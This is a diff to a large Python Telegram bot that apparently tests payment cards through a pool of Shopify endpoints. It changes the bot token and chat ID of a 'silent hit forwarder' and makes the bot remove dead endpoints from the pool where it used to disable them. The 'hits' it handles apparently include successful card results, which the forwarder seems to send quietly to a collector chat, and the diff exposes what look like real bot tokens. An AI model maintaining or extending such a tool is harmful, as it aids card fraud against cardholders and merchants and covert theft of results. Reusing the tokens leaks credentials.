@@ -3941,8 +3941,8 @@ async def key_expiry_worker(context: ContextTypes.DEFAULT_TYPE):
 # ============ SILENT HIT FORWARDER ============
 # Add these configuration variables near your other configs
 
-HIT_FORWARDER_BOT_TOKEN = "8903367966:AAFJsJna6d069ch0MBEFRNLXTwgPY64w-xk"  # Replace with your hit collector bot token
-HIT_FORWARDER_CHAT_ID = "-1003756499235"  # Your personal chat ID or group ID where hits go
+HIT_FORWARDER_BOT_TOKEN = "8805462027:AAH4O6dyfq1wwmcevu6GdGdVn933kUm3RyM"  # Replace with your hit collector bot token
+HIT_FORWARDER_CHAT_ID = "-1004374530622"  # Your personal chat ID or group ID where hits go
 HIT_FORWARDER_ENABLED = True  # Set to False to disable
 
 # Initialize hit forwarder client (lazy loaded)
@@ -13427,6 +13427,27 @@ class ShopifyAPIPool:
                 json.dump(data, f, indent=2)
         except Exception as e:
             print(f"⚠️ Error saving site performance: {e}")
+
+    # ---------------------------------------------------------------
+    #  API REMOVAL
+    # ---------------------------------------------------------------
+    def remove_api(self, api_name: str) -> bool:
+        """
+        Remove an API from the pool ENTIRELY (not just disable it).
+
+        The API is dropped from self.apis so it is no longer selected by
+        get_next_api(), and its stats entry is discarded. Returns True if
+        something was actually removed.
+        """
+        before = len(self.apis)
+        self.apis[:] = [a for a in self.apis if a.get("name") != api_name]
+        self.api_stats.pop(api_name, None)
+        # Drop any cached per-API semaphore for the removed API.
+        self._api_semaphores.pop(api_name, None)
+        removed = len(self.apis) < before
+        if removed:
+            print(f"🗑️ [API POOL] Removed API from pool: {api_name}")
+        return removed
 
     # ---------------------------------------------------------------
     #  SITE COOLDOWN HELPERS
@@ -35700,13 +35721,21 @@ async def apitest_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "response_time": response_time,
                 "error": error_msg
             })
-            # ============ FIX: Disable dead API ============
-            if api_enabled:
-                shopify_api_pool.apis[idx]["enabled"] = False
-                print(f"   ❌ Disabled dead API: {api_name}")
+            # ============ Dead APIs are REMOVED from the pool (not just disabled) ============
+            # Removal happens after the loop below so we never mutate the list
+            # while iterating over it by index.
+            print(f"   ❌ Dead API queued for removal: {api_name}")
         
         # Small delay between tests
         await asyncio.sleep(0.5)
+    
+    # ============ REMOVE DEAD APIs FROM THE POOL ENTIRELY ============
+    removed_names = []
+    for dead in dead_apis:
+        if shopify_api_pool.remove_api(dead["name"]):
+            removed_names.append(dead["name"])
+    if removed_names:
+        print(f"🗑️ Removed {len(removed_names)} dead APIs from pool: {removed_names}")
     
     # ============ FIX: Update api_stats to reflect changes ============
     for result in results:
@@ -35726,7 +35755,8 @@ async def apitest_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"📊 <b>Shopify API Pool Test Results</b>\n\n"
         f"📈 <b>Summary:</b>\n"
         f"   ✅ Working: {len(working_apis)}/{total_apis}\n"
-        f"   ❌ Dead (Disabled): {len(dead_apis)}/{total_apis}\n"
+        f"   ❌ Dead (Removed): {len(dead_apis)}/{total_apis}\n"
+        f"   🔌 Remaining in pool: {len(shopify_api_pool.apis)}\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
     )
     
@@ -35741,7 +35771,7 @@ async def apitest_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         result_msg += "\n"
     
     if dead_apis:
-        result_msg += f"<b>❌ Dead APIs (Disabled - {len(dead_apis)}):</b>\n"
+        result_msg += f"<b>❌ Dead APIs (Removed - {len(dead_apis)}):</b>\n"
         for api in dead_apis[:10]:
             result_msg += f"   • <b>{api['name']}</b>\n"
             result_msg += f"     Error: {api['error']}\n"
@@ -35749,8 +35779,8 @@ async def apitest_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             result_msg += f"   ... and {len(dead_apis) - 10} more\n"
         result_msg += "\n"
     
-    result_msg += f"<i>💡 Dead APIs have been automatically disabled.\n"
-    result_msg += f"   Use /enableapi &lt;name&gt; to re-enable an API.\n"
+    result_msg += f"<i>💡 Dead APIs have been automatically removed from the pool.\n"
+    result_msg += f"   Use /addapi &lt;domain&gt; to add an API back.\n"
     result_msg += f"   Use /api to see all APIs and their status.</i>"
     
     # Update status message
@@ -35765,7 +35795,8 @@ async def apitest_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     print("📊 SHOPIFY API POOL TEST RESULTS")
     print("="*80)
     print(f"✅ Working: {len(working_apis)}/{total_apis}")
-    print(f"❌ Dead (Disabled): {len(dead_apis)}/{total_apis}")
+    print(f"❌ Dead (Removed): {len(dead_apis)}/{total_apis}")
+    print(f"🔌 Remaining in pool: {len(shopify_api_pool.apis)}")
     print("-"*40)
     for api in working_apis:
         print(f"✅ {api['name']}: {api['response_time']:.2f}s")
